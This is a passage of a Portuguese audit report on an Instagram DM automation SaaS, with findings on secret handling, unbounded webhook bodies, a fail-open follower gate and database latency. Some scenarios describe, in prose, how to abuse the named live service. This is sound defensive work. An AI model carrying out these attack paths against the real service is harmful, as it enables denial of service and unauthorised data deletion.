**Recomendação:** Remover a aceitação por query string (o Worker já usa header) e comparar com `timingSafeEqual` sobre buffers de mesmo tamanho. Se um agendador externo for mesmo necessário, usar um segredo separado e rotacionável só para ele. Opcional: `[observability.logs] invocation_logs = false` ou excluir essas rotas dos logs.

### A3-007 [medium] Rota /api/cron/sequences aceita o CRON_SECRET na query string e fica exposta na internet
`src/app/api/cron/sequences/route.ts:30` · security · ⚠️ não verificado

**O que é:** O scheduled() do Worker chama handler.fetch internamente (worker.ts:31-33), então a rota de cron não precisa ser alcançável pela internet, mas é (está sob /sistema/*). A rota aceita `?secret=<CRON_SECRET>` além do header Bearer. Segredo em URL fica gravado em Workers Logs (invocation log traz a URL da requisição), em analytics/Logpush, em históricos de agendadores externos e proxies. A comparação usa `!==` (não constante; ver achado específico sobre comparações de segredo).

**Como acontece:** Operador configura um agendador externo com `?secret=`, como o comentário da rota sugere; qualquer pessoa com acesso aos logs do Worker (ou ao painel do agendador) lê o CRON_SECRET e passa a disparar /sistema/api/cron/purge (apaga usuários cancelados) e /sequences à vontade, além de poder causar sobrecarga chamando o tick em paralelo. Sem rate limiting, o endpoint também aceita força bruta do segredo com respostas 403.

**Evidência:** src/app/api/cron/sequences/route.ts:29-31 `const bySecret = request.nextUrl.searchParams.get("secret"); if (auth !== `Bearer ${secret}` && bySecret !== secret) return 403`; worker.ts:31-33 `ctx.waitUntil(handler.fetch(request, env, ctx)...)` (chamada interna, nunca passa pela borda).

**Recomendação:** Remover a aceitação por query string (o Worker envia header). Bloquear `/sistema/api/cron/*` para todo tráfego externo com uma regra de WAF (ex.: `http.request.uri.path starts_with "/sistema/api/cron/"` -> Block): a chamada interna de scheduled() não passa pelo WAF, então nada quebra. Comparar o segredo com hash SHA-256 de ambos os lados + `crypto.subtle.timingSafeEqual`, como recomenda a Cloudflare.

### A3-006 [medium] Webhooks da Meta e da Stripe bufferizam o corpo inteiro sem limite antes de validar a assinatura
`src/app/api/webhooks/meta/route.ts:29` · security · ⚠️ não verificado

**O que é:** `await request.text()` roda antes de qualquer verificação e sem checar Content-Length (Meta: linha 29; Stripe: src/app/api/webhooks/stripe/route.ts:24). O Worker tem 128 MB de memória por isolate; a Cloudflare aceita corpos de até 100 MB (Free/Pro) ou mais, e o HMAC-SHA256 é calculado sobre o corpo completo. Não há regra de WAF/limite de corpo no repositório.

**Como acontece:** Atacante anônimo envia POST de ~100 MB para https://falow.app.br/sistema/api/webhooks/meta (ou /stripe) com qualquer header de assinatura: o Worker lê o corpo em string (UTF-16 dobra o tamanho), estoura a memória do isolate (ou gasta CPU no HMAC/constructEventAsync) e derruba o isolate que também atende webhooks legítimos; repetindo em paralelo, nega serviço ao recebimento de DMs e eventos da Stripe.

**Evidência:** src/app/api/webhooks/meta/route.ts:29 `const rawBody = await request.text();` seguido de verifyMetaSignature na linha 32; src/app/api/webhooks/stripe/route.ts:24 `const body = await request.text();`

**Recomendação:** Rejeitar antes de ler: checar `content-length` (payloads da Meta e da Stripe têm poucos KB; ex. > 1 MB -> 413) e, como defesa em profundidade, regra de WAF na zona para `/sistema/api/webhooks/*` bloqueando `http.request.body.size` acima de 1 MB e métodos diferentes de POST/GET (a confirmar disponibilidade do campo no plano). Opcionalmente restringir por ASN/IPs publicados da Stripe (lista oficial) e exigir header `stripe-signature`/`x-hub-signature-256` presente na própria regra.

### A2-007 [medium] Rotação/perda da TOKEN_ENCRYPTION_KEY deixa contas 'active' quebradas em silêncio; formato sem versão de chave
`src/lib/crypto.ts:32` · reliability · ⚠️ não verificado

**O que é:** `decryptToken` lança um Error genérico ('Unsupported state or unable to authenticate data' do GCM) quando a chave muda. `getFreshToken` (token.ts:32) propaga esse erro; em process.ts:501/533 e runtime.ts:1218 só `GraphApiError` com code 190 marca a conta como 'expired'. Resultado: depois de uma troca de chave (ou de um deploy em que o build embutiu outra chave, ver achado do .env), todas as contas continuam 'active', todo evento da Meta vira interaction 'error' com uma mensagem técnica, o painel Contas (withSyncedProfiles) engole o erro e nada pede ao cliente para reconectar. O payload `iv.tag.ct` não carrega id de versão de chave, então não dá para rotacionar a chave sem invalidar tudo (o runbook em docs/operacao-saas.md:479 só avisa 'nunca gere um novo').

**Como acontece:** Operador roda `wrangler secret put TOKEN_ENCRYPTION_KEY` com valor novo (ou o Worker sobe com a chave de dev embutida pelo build): todos os bots de todos os clientes param de responder; o status na tela continua 'Conectado'; os clientes só descobrem pelos leads reclamando. A chave de IA de cada usuário some do mesmo jeito (decryptOrNull em ai-settings/server.ts:66 trata como ausente).

**Evidência:** crypto.ts:37-42 decifra e lança; token.ts:32 `const token = decryptToken(account.access_token_enc);` sem try/catch; process.ts:533 `if (err instanceof GraphApiError && err.code === 190)`

**Recomendação:** Criar um erro tipado (ex.: TokenUndecryptableError) e tratá-lo como o 190: marcar a conta 'expired' e mostrar 'Reconecte' no painel. Prefixar o payload com um id de chave (`v1.` ou `k<id>.`) e aceitar TOKEN_ENCRYPTION_KEY_PREVIOUS para recifrar em background (ou na próxima leitura), permitindo rotação planejada. Adicionar um teste de fumaça no boot: decifrar um valor conhecido com a chave carregada.

### A3-001 [medium] Portão de seguidor libera o conteúdo quando a consulta à Graph API falha (fail-open)
`src/lib/follow-gate/check.ts:36` · security · ⚠️ não verificado

**O que é:** checkFollow transforma qualquer erro da Graph API que não seja token inválido (190) em status "unknown" (incluindo rate limit códigos 4/17/32/613, 5xx da Meta, erro 230 de consentimento e resposta sem o campo is_user_follow_business, que graph.ts:395 transforma em GraphApiError sem código). holdUnlessFollowing (gate.ts:44-47) trata "unknown" como "pode entregar": o conteúdo sai para quem não segue, só com um detalhe no log. O comentário do código registra isso como decisão D2, mas do ponto de vista de segurança o portão vira opcional sempre que a Meta estiver instável ou a conta estiver limitada.

**Como acontece:** Um grupo de contas falsas manda a palavra-chave (ou toca em "Já segui") em rajada para uma conta com portão ligado; cada evento gera 1-2 chamadas GET /{igsid}?fields=is_user_follow_business com o token da conta. Quando a Meta devolve rate limit (ou está fora do ar), todas as pessoas, seguidoras ou não, recebem o conteúdo retido. Também basta um erro transitório no exato momento do toque em "Já segui" para a trava lockDelivery ser tomada e o conteúdo sair sem checagem.

**Evidência:** check.ts:36-42 `catch (err) { if (err instanceof GraphApiError && err.code === 190) throw err; return { status: "unknown", ... } }` e gate.ts:44-47 `if (follow.status === "unknown") { console.warn(...); return { held: false, detail: ... } }`

**Recomendação:** Tratar "unknown" como retido (fail-closed) ao menos para erros de rate limit e 5xx: reenviar o portão (ou uma mensagem "tenta de novo em instantes") em vez de entregar; manter fail-open só para o erro 230 (sem consentimento), se for decisão de produto, e deixar isso configurável por automação. Registrar o status "awaiting_follow" com o motivo para o dono ver no log.

### A2-011 [medium] Eventos de um mesmo lote do webhook são processados estritamente em série
`src/lib/meta/process.ts:167` · optimization · ⚠️ não verificado

**O que é:** `for (const event of entry.messaging ?? []) await processMessagingEvent(...)` e os comentários logo abaixo rodam um a um. Eventos de remetentes diferentes são independentes (dedupe por mid, locks por (rule_id, ig_sender_id)), mas cada um espera o anterior terminar, incluindo o sleep humanizado. Em picos (ex.: 20 comentários num Reel viral no mesmo lote) a latência do lote é 20×(delay 2–5s + Graph API) ≈ 60–120s, acima do orçamento de 40s; os últimos eventos só são atendidos pela reentrega da Meta.

**Como acontece:** Lote com N eventos de pessoas diferentes → tempo total = soma dos N (delay + 2–3 chamadas Graph + ~15 queries) em vez do máximo deles.

**Evidência:** process.ts:166-179: `await observeOutbound(..., async () => { for (const event of entry.messaging ?? []) { await processMessagingEvent(entry.id ?? "", event, deadline); } ...`

**Recomendação:** Agrupar eventos por ig_sender_id e processar grupos diferentes em paralelo com limite de concorrência (ex.: 5), mantendo a ordem dentro do mesmo remetente. Combinado com o processamento em background, elimina o estouro do orçamento.

### A2-012 [medium] Uma única DM recebida gera ~25–30 round trips sequenciais ao Supabase (a mesma linha de conversations é lida/escrita 7+ vezes)
`src/lib/meta/process.ts:249` · optimization · ⚠️ não verificado

**O que é:** Para 1 DM com texto que casa uma regra, o pipeline faz: processed_events insert (1), findServedAccount → ig_accounts + access_grants + subscriptions (3), touchConversation = upsert + 2 updates (3), isTakenOver (1), handleSequenceReply select (1), automationPausedUntil (1), rules select (1), rule_triggers select (1), getFreshToken (0–1), Graph send, rule_triggers upsert (1), interactions insert (1), startSequenceFromRule select (1). Em paralelo o CRM (captureMessagingEvent) faz findAccount (1), ensureConversation upsert (1), messages insert (1), applyPendingSignals select (1), conversations update status (1), leadNeedsProfile (1), ensureConversation de novo (1), ensureDefaultPipeline (1), currentLeadOf (1), firstOpenStage (1), moveLead → loadStage (2) + currentLeadOf (1) + endOfColumnPosition (1) + insert lead + insert event. Depois ainda expireAutomationsSafe (4 writes) e processDueRuns (recoverStaleRuns + due = 2). A linha de `conversations` da pessoa é tocada por touchConversation (3), isTakenOver, automationPausedUntil, ensureConversation (2), leadNeedsProfile e update status: 9 idas para 1 linha. Com ~30–60 ms por round trip Worker→Supabase, são 1–2 s de latência pura de banco por DM antes de qualquer delay humanizado.

**Como acontece:** 1 DM → ~30 consultas sequenciais; 1.000 DMs/hora → ~30.000 consultas/hora, maioria redundante (mesma conta, mesma conversa).

**Evidência:** process.ts:243-295 (findServedAccount, touchConversation, isTakenOver, handleSequenceReply, automationPausedUntil em sequência); touchConversation em process.ts:125-142 faz upsert + update + update; capture-event.ts:40-53 chama recordIncoming (que já faz ensureConversation) e depois ensureConversation de novo na linha 51.

**Recomendação:** Ler a conversa uma vez (human_takeover_at, automation_paused_until, last_inbound_at, ig_profile_fetched_at) e passar o snapshot adiante; trocar touchConversation por um único `upsert` com `last_inbound_at = greatest(...)` via RPC; reaproveitar o conversation_id devolvido por recordIncoming em vez de chamar ensureConversation de novo; cachear a conta/acesso por invocação (ver achado específico).

### A3-008 [medium] Trabalho longo (pausas de 2-5 s, typing, atrasos inline até 20 s) dentro do fetch do webhook; retry da Meta + dedup por mid perde a mensagem
`src/lib/meta/process.ts:470` · reliability · ⚠️ não verificado

**O que é:** O POST do webhook da Meta responde só depois de processar tudo inline: `sleep(clampDelay(...))` por regra (process.ts:470, 730, 953), `humanPause` de 2-3,5 s por nó (runtime.ts:1322), atrasos de até 20 s dormidos na própria invocação (runtime.ts:89 e 1003), mais o tick oportunista (process.ts:186-187), com orçamento de 40 s (runtime.ts:91). `maxDuration = 60` (meta/route.ts:11, cron/sequences/route.ts:7) é um ajuste da Vercel e não tem efeito no Worker; o limite real é o tempo de CPU do plano e o tempo que o cliente (Meta) mantém a conexão aberta. A recomendação da Cloudflare é responder rápido e empurrar o trabalho para Queues/Workflows ou, no mínimo, `ctx.waitUntil` (30 s após a resposta). A dedup por `processed_events.mid` (process.ts:234-238) é feita ANTES do envio, então uma invocação interrompida já marcou o evento como processado.

**Como acontece:** Lote com várias mensagens/regras numa mesma entrega: a soma de pausas passa do timeout do webhook da Meta (valor a confirmar na doc da Meta); a Meta fecha a conexão e reenvia o evento; se o runtime encerra/cancela a invocação com o cliente desconectado (OpenNext passa `request.signal` ao handler), a resposta não é enviada; a reentrega bate em `processed_events` e retorna cedo -> o seguidor nunca recebe a resposta e o painel mostra a interação como processada. Mesmo sem cancelamento, a Meta contabiliza falhas e pode desativar o webhook após muitos timeouts.

**Evidência:** src/lib/meta/process.ts:470 `await sleep(clampDelay(rule.delay_seconds) * 1000);` (dentro de applyRule, no caminho do POST); src/lib/sequences/runtime.ts:1003-1004 `if (ms <= INLINE_DELAY_MAX_MS && ...) { await sleep(ms);` ; src/app/api/webhooks/meta/route.ts:44-52 `await processWebhookPayload(payload) ... return NextResponse.json({ received: true })`.

**Recomendação:** Responder 200 imediatamente após validar a assinatura e processar em `ctx.waitUntil` (OpenNext expõe o contexto via `getCloudflareContext()`), ou, melhor, enfileirar o payload numa Cloudflare Queue/Workflow e deixar o consumidor fazer as pausas humanizadas (Workflows suportam `step.sleep`). Mover a dedup por mid para depois do envio bem-sucedido ou gravar o estado (claimed/sent). Remover `maxDuration` e, se o plano for Paid, declarar `[limits] cpu_ms` explicitamente (a confirmar o plano da conta: no Free o limite de 10 ms de CPU inviabiliza este Worker).

### A3-011 [medium] Cerca de 35 chamadas PostgREST sequenciais (mais 4 escritas de expiração) por DM recebida; latência regional acumulada
`src/lib/meta/process.ts:186` · optimization · ⚠️ não verificado

**O que é:** Contagem para uma DM com regra casada (sem portão): pipeline principal ~16 chamadas (processed_events, ig_accounts + access_grants + subscriptions em findServedAccount, 3 updates em touchConversation, isTakenOver, handleSequenceReply, automationPausedUntil, rules, rule_triggers x2, interactions, sequences); captura CRM ~9 (findAccount, ensureConversation x2, messages, message_signals_pending, conversations update, leadNeedsProfile, pipelines, leads); observeOutbound ~4 por envio; fim do webhook: expireAutomations faz 4 DELETE/UPDATE varrendo rules e sequences (sweep.ts:30-46) + recoverStaleRuns + select de due. A tabela `conversations` da mesma pessoa é consultada/atualizada 7 vezes separadas (touchConversation, isTakenOver, automationPausedUntil, leadNeedsProfile, ensureConversation x2, update status). O Supabase é regional (PostgREST por HTTP) e o Worker roda na borda perto do egresso da Meta; cada ida custa um RTT inteiro. A Cloudflare recomenda placement explícito para Workers com várias consultas sequenciais a um banco regional.

**Como acontece:** Com RTT Worker->Supabase de ~80-150 ms (região a confirmar), só os round-trips somam 3-5 s por DM, antes das pausas humanizadas e das chamadas à Graph API; isso encurta o orçamento de 40 s do tick/sequências (mais runs estacionados) e multiplica o custo de leitura/escrita no Postgres (4 varreduras de expiração por webhook, mesmo sem nada vencido).

**Evidência:** src/lib/meta/process.ts:125-142 (3 chamadas em touchConversation), :254 isTakenOver, :295 automationPausedUntil, :186-187 `await expireAutomationsSafe(); await processDueRunsSafe(3, ...)`; src/lib/expiry/sweep.ts:30-46 dois DELETE+UPDATE por tabela a cada chamada; src/modules/crm/capture/server/record.ts:46-75 e :106-127.

**Recomendação:** Consolidar as leituras de `conversations` numa única select (human_takeover_at, automation_paused_until, ig_sender_username, ig_profile_fetched_at, last_inbound_at) e o touch num único UPSERT com `GREATEST`; mover expireAutomations só para o cron de 1 minuto; usar uma RPC Postgres para o caminho quente; configurar `[placement] mode = "smart"` ou region hint no wrangler.toml alinhado à região do projeto Supabase (a confirmar a região) e medir a duração das invocações nos Workers Logs antes/depois.

### A2-013 [medium] findServedAccount repete 3 consultas (ig_accounts, access_grants, subscriptions) para cada evento do mesmo lote e por chamada
`src/lib/meta/served-account.ts:14` · optimization · ⚠️ não verificado

**O que é:** Cada evento chama findServedAccount, que faz `ig_accounts` + `hasActiveAccess` (access_grants + subscriptions). Um lote com 20 eventos da mesma conta repete as 3 consultas 20 vezes (60 round trips) para a mesma resposta. O CRM ainda faz um 4º select da mesma conta em `findAccount` (record.ts:22-31) e `observeOutbound` resolve `findAccountId` de novo no 1º envio. No tick do cron, `accountHasAccess` (runtime.ts:666) lê `ig_accounts.user_id` e depois a linha 705 lê `ig_accounts.select("*")` de novo para o mesmo id.

**Como acontece:** Lote de 20 eventos → 60–80 consultas de conta/acesso onde bastariam 3. Tick com 10 runs da mesma conta → 10×(3 de acesso + 1 isTakenOver + ig_accounts) = 50 consultas.

**Evidência:** served-account.ts:14-21: `.from("ig_accounts").select("*")...; if (!(await hasActiveAccess(admin, account.user_id)))` chamado em process.ts:243, 634, 786, 843; runtime.ts:666 `accountHasAccess` e 705-710 `ig_accounts.select("*")`.

**Recomendação:** Resolver conta + acesso uma vez por invocação (memo por ig_user_id dentro de processWebhookPayload e por account_id dentro de processDueRuns) e passar o objeto `account` para o CRM e para o observeOutbound; opcionalmente uma view/RPC `served_account(ig_user_id)` que devolve conta e flag de acesso numa consulta.

### A1-005 [medium] Tick das sequências é serial e com pausa humanizada obrigatória: teto real de ~6–10 retomadas por minuto, backlog acumula e vira window_expired
`src/lib/sequences/runtime.ts:625` · reliability · ⚠️ não verificado

**O que é:** processDueRuns(10) (cron) processa os runs vencidos um a um dentro de um orçamento de 40s (INVOCATION_BUDGET_MS) reservando 10s por bloco (NODE_BUDGET_MS). Cada retomada paga, antes de executar, 6 idas ao banco (accountHasAccess = 3 queries, isTakenOver, claimRun, busca da conta) e, por mensagem enviada, humanPause de 2–3,5s + ensureWindowOpen + Graph API (~0,3–1s). Um atraso de até 20s ainda roda inline (sleep) dentro do próprio tick. Na prática cada run custa 4–6s e o laço quebra em `Date.now() + NODE_BUDGET_MS > deadline`, o que dá ~6–8 runs por tick do cron (1x/min) mais 3 por webhook quando há tráfego. A fila é FIFO por next_run_at, então com backlog TODOS os atrasos passam a disparar tarde, e os que ultrapassarem a janela de 24h da Meta terminam como window_expired (a pessoa fica travada pelo unique (sequence_id, ig_sender_id) e nunca recebe o resto). O orçamento de 40s foi dimensionado pelo `maxDuration = 60` da rota, que é diretiva da Vercel e não tem efeito no Cloudflare Worker; o handler `scheduled()` do Worker tem até 15 min de wall-time (CPU 30s por padrão, o sleep não conta), ou seja, o cron poderia processar muito mais por tick.

**Como acontece:** Campanha com 1.000–2.000 pessoas entrando num workflow com nó 'Atraso 1h' (ex.: lançamento, resposta a story em massa). Às 10:00 todos viram waiting_delay com next_run_at 11:00. A partir das 11:00 o cron retoma ~8/min: o último só é retomado ~2–4h depois; quem entrou pela manhã e tinha um 2º atraso (ou um atraso de 20h+) cai fora da janela de 24h e o run morre como window_expired. Enquanto isso, delays de TODAS as outras contas do SaaS ficam presos na mesma fila.

**Evidência:** runtime.ts:91 `INVOCATION_BUDGET_MS = 40 * 1000` (comentário: 'maxDuration das rotas é 60s'); :637-644 select limit(limit) ordenado por next_run_at; :651 `if (Date.now() + NODE_BUDGET_MS > deadline) break;`; :666/684/693/705 quatro consultas por run antes de executar; :1003-1004 atraso <= 20s dorme inline; :1322 `await sleep(2000 + Math.floor(Math.random() * 1500))` em todo envio; src/app/api/cron/sequences/route.ts:36 `processDueRuns(10)` com deadline padrão; wrangler.toml:28 cron `* * * * *` sem `[limits]`.

**Recomendação:** Dar ao cron um orçamento próprio e maior (ex.: processDueRuns(limit, deadline) com 5–10 min no contexto do scheduled(), mantendo o budget curto só no webhook); executar runs de contas diferentes em paralelo (Promise.allSettled com concorrência por conta, ou um Cloudflare Queue consumer por run); reduzir/eliminar a humanPause em retomadas por atraso (a pessoa não está 'conversando' naquele instante); buscar contas/conversas do lote em uma query só; e medir o backlog (count de waiting_delay vencidos) com alerta.

### A1-006 [medium] Tick oportunista + sleeps inline seguram a resposta 200 do webhook da Meta por dezenas de segundos; invocação cancelada deixa runs presos em running
`src/lib/sequences/runtime.ts:821` · reliability · ⚠️ não verificado

**O que é:** O webhook (src/app/api/webhooks/meta/route.ts:45) só responde 200 depois de `await processWebhookPayload`, e esse pipeline termina chamando `expireAutomationsSafe()` + `processDueRunsSafe(3, ...)` (process.ts:186-187), ou seja, retoma até 3 runs de QUALQUER conta (cada um 4–25s: humanPause 2–3,5s por mensagem, atraso inline de até 20s, Graph API com timeout de 15s) antes de devolver a resposta à Meta. Soma-se a isso o próprio fluxo iniciado pelo evento (um workflow 'mensagem → atraso 20s → mensagem' custa ~27s inline). A Meta exige 200 rápido e reenvia/contabiliza falha quando o endpoint demora (prazo exato a confirmar na doc da Meta, na casa de poucos segundos a ~20s); reenvios caem no dedupe de processed_events, mas falhas repetidas podem levar a Meta a desabilitar a assinatura do webhook. No Cloudflare Workers, se o cliente (Meta) desconectar antes da resposta, a invocação pode ser cancelada a não ser que o trabalho esteja em ctx.waitUntil (a confirmar na doc do Workers runtime): o run reivindicado fica em `running`, e recoverStaleRuns o encerra como `error` 5 min depois ('Execução interrompida'), travando a pessoa pelo unique sem ela receber nada.

**Como acontece:** Conta A recebe uma DM; na mesma invocação o tick pega 3 runs vencidos das contas B, C e D, cada um com humanPause + envio (ou um atraso inline de 20s). A resposta 200 para a Meta sai 30–40s depois. A Meta trata como timeout, reenvia o evento (dedupe segura) e registra falha; repetido ao longo do dia (cron de 1 min nunca zera o backlog, ver achado anterior), o endpoint entra em degradação. Se o Worker for cancelado na desconexão, os runs de B/C/D ficam `running` → `error` após 5 min.

**Evidência:** runtime.ts:821-833 `processDueRunsSafe(limit = 3, deadline)`; :89 `INLINE_DELAY_MAX_MS = 20 * 1000`; :1003-1004 `await sleep(ms)`; :1316-1323 humanPause; :98 `STALE_RUNNING_MS = 5 * 60 * 1000` e :771-818 recoverStaleRuns encerra como error; src/lib/meta/process.ts:186-187 `await expireAutomationsSafe(); await processDueRunsSafe(3, invocationDeadline(invocationStart));`; src/app/api/webhooks/meta/route.ts:44-52 responde só após o await; nenhum uso de waitUntil/getCloudflareContext no src (grep).

**Recomendação:** Mover o tick oportunista (e idealmente todo o processamento após a verificação de assinatura + dedupe) para `ctx.waitUntil` via `getCloudflareContext()` do @opennextjs/cloudflare, respondendo 200 imediatamente; ou simplesmente remover o tick do webhook, já que o cron roda a cada minuto. Trocar o atraso inline por waiting_delay sempre que a execução estiver num webhook. Se a invocação puder ser cancelada, reduzir STALE_RUNNING_MS e, em vez de encerrar como error, retomar do último nó persistido quando nada foi enviado depois dele.

### A1-007 [medium] Erro transitório da Graph API (timeout, 5xx, rate limit) encerra o run como `error` para sempre, sem retry, e a pessoa fica travada pelo unique
`src/lib/sequences/runtime.ts:1239` · reliability · ⚠️ não verificado

**O que é:** graphPost não tem retry (um fetch com AbortSignal.timeout(15s)); qualquer exceção no envio dentro de runNodes cai no catch e persiste o run como `error` (exceto 190/token e WindowClosedError). Só a entrada no fluxo (discardRunIfNothingSent) apaga o run; em retomadas por atraso, resposta ou botão o run morre com last_error e, por causa do unique (sequence_id, ig_sender_id), a pessoa nunca mais consegue entrar nesse workflow. Códigos tipicamente transitórios da Meta (1, 2, 4, 17, 32, 613 'rate limit', HTTP 5xx, AbortError/ETIMEDOUT do fetch) são tratados igual a um erro permanente.

**Como acontece:** Run parado em 'Atraso 1h'; no cron o envio da próxima mensagem recebe HTTP 503 da Meta ou estoura os 15s. runNodes → catch → persistRun(run, 'error'). A pessoa não recebe o restante do fluxo e um novo 'oi' não reinicia nada (duplicate_skip). Em pico de tráfego (rate limit 613/32) isso acontece em lote.

**Evidência:** runtime.ts:1216-1244 catch único: `await persistRun(admin, run, 'error', { steps_executed: steps, last_error: detail })`; src/lib/meta/graph.ts:42-57 `graphPost` sem retry, `signal: AbortSignal.timeout(15_000)`; migrations/0001_init.sql:145 `unique (sequence_id, ig_sender_id)`.

**Recomendação:** Classificar o erro: para transitórios (timeout/AbortError, 5xx, códigos 1/2/4/17/32/613), estacionar o run em waiting_delay com next_run_at = agora + backoff (1, 5, 15 min) e um contador em `variables.__retries[nodeId]`, só marcando `error` após N tentativas; para permanentes (10, 100, 200, 551 'não pode receber mensagem') manter o comportamento atual. Registrar o código/subcódigo no last_error para diagnóstico.

### A2-014 [medium] maybeStartSequence carrega todos os workflows ativos com o grafo inteiro (select *) a cada DM
`src/lib/sequences/runtime.ts:166` · optimization · ⚠️ não verificado

**O que é:** Para avaliar o gatilho (um nó pequeno dentro de `graph`), a função busca `sequences.select("*")` de todos os workflows ativos da conta e desserializa cada JSON. É chamada para toda DM com texto que não casou regra (process.ts:347) e, para story/referral, possivelmente duas vezes (process.ts:312 e 347). Uma conta com 40 workflows de ~30–100 KB de grafo transfere 1–4 MB e faz parse de todos eles por DM sem match.

**Como acontece:** Conta com 40 workflows, 500 DMs/dia sem match → 20.000 grafos desserializados e ~1 GB/dia de transferência Supabase→Worker só para checar palavras-chave de gatilho.

**Evidência:** runtime.ts:166-171: `.from("sequences").select("*").eq("account_id", account.id).eq("is_active", true).order("created_at")` seguido de `findTriggerNode(sequence.graph)` para cada.

**Recomendação:** Materializar os dados do gatilho numa coluna própria (ex.: `trigger jsonb` ou `trigger_kind` + `trigger_keywords`) atualizada no save, consultar só essa coluna e carregar `graph` apenas do workflow que casou; evitar chamar maybeStartSequence duas vezes para o mesmo evento.

### A2-015 [medium] recoverStaleRuns varre sequence_runs sem índice a cada webhook e a cada minuto no cron
`src/lib/sequences/runtime.ts:778` · optimization · ⚠️ não verificado

**O que é:** A consulta `status = 'running' and updated_at < cutoff order by updated_at` não tem índice: `sequence_runs_due_idx` é parcial para `waiting_delay` e `sequence_runs_waiting_idx` para `waiting_reply/waiting_postback`. Como processDueRuns roda ao fim de cada webhook (process.ts:187) e no cron a cada minuto, é um seq scan da tabela inteira por webhook + 1.440/dia pelo cron. Com 200 mil runs históricos (completed/error acumulam para sempre), cada varredura lê a tabela toda.

**Como acontece:** Tabela sequence_runs com 200k linhas → seq scan de ~50 MB por webhook e por minuto; a latência do webhook cresce com o histórico de execuções.

**Evidência:** runtime.ts:778-784: `.from("sequence_runs").select("*, sequences(name)").eq("status", "running").lt("updated_at", cutoff)`; migrations 0001:149-153 só criam índices parciais para waiting_delay e waiting_reply/postback.

**Recomendação:** Criar `create index sequence_runs_running_idx on sequence_runs (updated_at) where status = 'running'`; rodar recoverStaleRuns só no cron (não no tick oportunista do webhook).

### A3-004 [medium] CRM continua gravando mensagens e usando o token de cliente sem acesso (cancelado, bloqueado ou cortesia vencida)
`src/modules/crm/capture/server/capture-event.ts:34` · reliability · ⚠️ não verificado

**O que é:** As automações usam findServedAccount (status active + hasActiveAccess), mas a captura do CRM, que roda em paralelo para todo evento `messaging[]`, usa findAccount (só status active). Para um cliente cancelado, bloqueado pelo admin ou com cortesia vencida, cada DM, eco, reação, visto e edição que chega continua sendo gravado em `messages`/`conversations`, o lead entra no funil (enrollLeadFromCapture) e, na primeira mensagem do lead, refreshLeadProfile chama a Graph API com o token do cliente (getFreshToken, que pode inclusive renovar o token). Ou seja, o sistema segue processando dados pessoais de leads e agindo com o token de alguém que já não é cliente, e o banco cresce sem ninguém pagar. A confirmar se é intencional (manter histórico para quem reativa).

**Como acontece:** Cliente cancela ou é bloqueado → a Meta segue mandando webhooks do @ (a inscrição não é desfeita) → captureMessagingEvent acha a conta (active) e grava tudo + chama getFullUserProfile com o token dele, por até 30 dias (purge) ou indefinidamente (bloqueado/cortesia vencida nunca é purgado).

**Evidência:** capture-event.ts:34 `const account = await findAccount(admin, businessId)`; record.ts:22-31 findAccount filtra só `status = active`; capture-event.ts:45 `await refreshLeadProfile(admin, account, message.leadId)` → refresh-profile.ts:34 `getFreshToken(admin, account)`; served-account.ts:21 é quem checa hasActiveAccess, só para as automações.

**Recomendação:** Usar findServedAccount (ou aplicar hasActiveAccess/accountHasAccess) também na captura do CRM e no observeOutbound, ou pelo menos não chamar a Graph API (refreshLeadProfile) para contas de usuários sem acesso. Se a intenção for preservar histórico para quem reativa, documentar e limitar a gravação (sem chamadas à Graph) e garantir purge para bloqueados/cortesia vencida.

### A1-004 [medium] CRM grava mensagens, inscreve no funil e consulta a Graph API para contas de usuário bloqueado/sem assinatura
`src/modules/crm/capture/server/record.ts:22` · security · ⚠️ não verificado

**O que é:** O bot usa findServedAccount (src/lib/meta/served-account.ts:21), que exige hasActiveAccess. A captura do CRM usa findAccount (record.ts:22-31), que só confere status='active'. Assim, para uma conta cujo dono está bloqueado ou com assinatura cancelada, cada evento do webhook continua: gravando mensagens (capture-event.ts:40), buscando o perfil do lead na Graph API com o token do usuário (capture-event.ts:44-45 → refreshLeadProfile) e criando funil padrão/lead (capture-event.ts:51-52 → enrollLeadFromCapture → ensureDefaultPipeline).

**Como acontece:** Cliente cancelado ou bloqueado por admin mantém a conta Instagram conectada; cada DM que chega gera 1 chamada à Graph API em nome dele e linhas em messages/conversations/leads/pipelines, consumindo banco e cota de API de um usuário que, pela regra do produto, não é mais atendido. A confirmar se guardar o histórico é intencional; a chamada à Graph API e a criação de funil dificilmente são.

**Evidência:** record.ts:24-29 `.eq("ig_user_id", igUserId).eq("status", "active")` sem hasActiveAccess; served-account.ts:21 faz a checagem só para o bot.

**Recomendação:** Usar findServedAccount na captura (ou chamar hasActiveAccess em findAccount) e, se quiser preservar histórico de quem cancelou, pelo menos pular refreshLeadProfile e enrollLeadFromCapture quando o dono não tem acesso.

### A2-010 [medium] Realtime do Inbox e do Funil: inscrição sem filtro em tabelas inteiras e cada evento refaz a página inteira no servidor
`src/modules/crm/inbox/hooks/use-inbox-realtime.ts:40` · optimization · ⚠️ não verificado

**O que é:** O Inbox assina `postgres_changes` com `event: "*"` em `messages` e `conversations` sem `filter` (linhas 40-43) e o Funil faz o mesmo em `leads` (use-pipeline-realtime.ts:34-37). Com postgres_changes, o Supabase Realtime avalia a policy RLS (`account_id in (select id from ig_accounts where user_id = auth.uid())`) para cada evento × cada assinante conectado: um webhook de um tenant gera trabalho proporcional ao número de usuários com o Inbox aberto em todos os tenants (limite conhecido de escala do postgres_changes). No cliente, cada evento vira `router.refresh()` (debounce de 1s/600ms), que re-executa a página inteira no Worker: o layout (getUser + `listPresets` + `isAiEnabled` + `getUnreadTotal`) e a página de conversas (`listConversations` + `attachTagsToConversations`/2 consultas de tags + `getThread` com 8 queries em paralelo em inbox.queries.ts:127-161 + listTagCatalog), ~15 consultas e um RSC completo. Como o pipeline de captura gera 4–6 eventos de UPDATE por DM (ver achado do upsert em ensureConversation), uma conta com 1 DM/segundo mantém o Worker re-renderizando o Inbox de cada atendente continuamente. O mesmo padrão no Funil (use-pipeline-realtime.ts:36) refaz getBoard (2 + N etapas consultas).

**Como acontece:** Custo real: N assinantes × M eventos avaliações de RLS no Realtime + N × (~15 queries + render RSC) no Worker por rajada. Operadora com Inbox aberto durante campanha (60 DMs/min) → ~60 re-renders/min × ~15 consultas = ~900 consultas/min por aba; latência percebida e CPU time do Worker (cobrado) crescem com o número de clientes, e o Realtime do Supabase pode começar a descartar eventos (silenciosamente, como já observado pelos autores em 28/09/2026).

